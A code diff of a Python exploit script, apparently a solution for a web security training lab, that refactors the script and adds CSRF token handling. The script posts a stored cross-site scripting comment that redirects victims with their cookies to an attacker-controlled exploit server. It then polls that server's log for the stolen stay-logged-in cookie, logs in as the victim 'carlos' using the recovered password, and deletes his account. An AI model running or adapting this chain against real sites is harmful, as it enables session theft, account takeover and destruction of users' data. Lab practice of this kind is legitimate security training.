@@ -3,6 +3,7 @@ import base64
 import sys
 import urllib3
 import time
+from bs4 import BeautifulSoup
 
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning) # type: ignore
 
@@ -17,30 +18,40 @@ headers = {
     'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.132 Safari/537.36'
 }
 
-def XSS_injection(s, url, url_exploit):
-    comment_url = url + '/post/comment'
+
+def get_csrf_token(s, url, path):
+    target_url = url + path
+    r = s.get(target_url, headers=headers)
+    soup = BeautifulSoup(r.text, 'html.parser')
+    csrf = soup.find("input", {'name': 'csrf'})
+    return csrf.get('value', '') if csrf else '' # type: ignore
+
+def post_comment(s, url, path, csrf_path, postId, comment, name, email, website):
+    target_url = url + path
     payload = {
-        'postId': '2',
-        'comment': f"<script>document.location=\'{url_exploit}\' + document.cookie</script>",
-        'name': 'test',
-        'email': 'test@gmail.com',
-        'website': 'https://test.com',
+        'csrf': get_csrf_token(s, url, csrf_path),
+        'postId': postId,
+        'comment': comment,
+        'name': name,
+        'email': email,
+        'website': website
     }
-    r = s.post(comment_url, data=payload, headers=headers)
+    r = s.post(target_url, data=payload, allow_redirects=False)
 
-    injected_url = url + '/post?postId=2'
-    r = s.get(injected_url, headers=headers, allow_redirects=True)
-    if '<script>' in r.text:
-        print('(+) Success injection web page')
+    if r.status_code == 302:
+        print('[+] Success post a comment')
+    else:
+        print('[-] Failed to post a comment')
+        sys.exit(-1)
 
-def get_stay_logged_cookie(s, url_exploit):
-    log_url = url_exploit + '/log'
-    r = s.get(log_url)
-    print('Wait for vitim click injection page .....')
+def get_stay_logged_cookie(s, exploit_url, path):
+    target_url = exploit_url + path
+    r = s.get(target_url)
+    print('Wait for vitim click injection page...')
     while 'stay-logged-in=' not in r.text:
         time.sleep(2)
-        r = s.get(log_url)
-    stay_cookie = r.text.split('stay-logged-in=')[1].split(' HTTP')[0]
+        r = s.get(target_url)
+    stay_cookie = r.text.split('stay-logged-in=')[-1].split(' HTTP')[0]
     return stay_cookie
 
 def decode_cookie(stay_cookie):
@@ -50,46 +61,61 @@ def decode_cookie(stay_cookie):
     password = input('Type password decoded here: ')
     return password
 
-def login_carlos_acc(s, url, password):
-    login_url = url + '/login'
+def login_acc(s, url, path, csrf_path, username, password):
+    login_url = url + path
     payload = {
-        'username': 'carlos',
-        'password': password,
+        "csrf": get_csrf_token(s, url, csrf_path),
+        "username": username,
+        "password": password
     }
-    print('Log in Carlos account..')
-    r = s.post(login_url, data=payload, headers=headers, allow_redirects=True)
-    if 'Delete account' in r.text:
-        print('(+) Successful log in Carlos account')
+    r = s.post(login_url, data=payload, allow_redirects=False)
+    if r.status_code == 302:
+        print(f'[+] Successful login {username} account')
     else:
-        print('(-) Fail to login Carlos account or deleted acc')
+        print(f'[-] Fail to login {username} account')
+        sys.exit(-1)
 
-def delete_carlos_acc(s, url, password):
-    delete_url = url + '/my-account/delete'
+def delete_acc(s, url, path, username, password):
+    target_url = url + path
     payload = { 'password': password }
-    r = s.post(delete_url, data=payload, headers=headers, allow_redirects=True)
+    r = s.post(target_url, data=payload, allow_redirects=False)
+    
+    if r.status_code == 302:
+        print(f'[+] Successful delete {username} account')
+    else:
+        print(f'[-] Failed to delete {username} account')
+        sys.exit(-1)
 
-    if 'Congratulations, you solved the lab!' in r.text:
-        print('Deleted Carlos account')
-        print("(+) Successful solved lab")
-        sys.exit()
-    print('(-) Fail to solve')
-    sys.exit(-1)
-
+def check_solved_lab(s, url):
+    r = s.get(url)
+    if "Congratulations, you solved the lab!" in r.text:
+        print("[+] Successful solved lab")
+        sys.exit(0)
 
 def main():
     if len(sys.argv) != 3:
-        print("(+) Usage: %s <url> <url_exploit>" % sys.argv[0])
-        print("(+) Example: %s www.example.com www.exploit_server.com" % sys.argv[0])
+        print("(+) Usage: %s <url> <exploit_url>" % sys.argv[0])
+        print("(+) Example: %s www.example.com www.exploit.com" % sys.argv[0])
         sys.exit(-1)
 
     s = requests.Session()
-    url = sys.argv[1]
-    url_exploit = sys.argv[2]
-    XSS_injection(s, url, url_exploit)
-    stay_cookie = get_stay_logged_cookie(s, url_exploit)
+    url = sys.argv[1].rstrip('/')
+    exploit_url = sys.argv[2].rstrip('/')
+
+    target_username = 'carlos'
+    postId = 2
+    comment = f"<script>document.location='{exploit_url}/log?c=' + document.cookie</script>"
+    name = 'test'
+    email = 'test@gmail.com'
+    website = 'https://test.com'
+
+    post_comment(s, url, '/post/comment', f'/post?postId={postId}', postId, comment, name, email, website)
+    stay_cookie = get_stay_logged_cookie(s, exploit_url, '/log')
     password = decode_cookie(stay_cookie)
-    login_carlos_acc(s, url, password)
-    delete_carlos_acc(s, url, password)
+    login_acc(s, url, '/login', '/login', target_username, password)
+    delete_acc(s, url, '/my-account/delete', target_username, password)
+
+    check_solved_lab(s, url)
 
 if __name__ == '__main__':
     main()
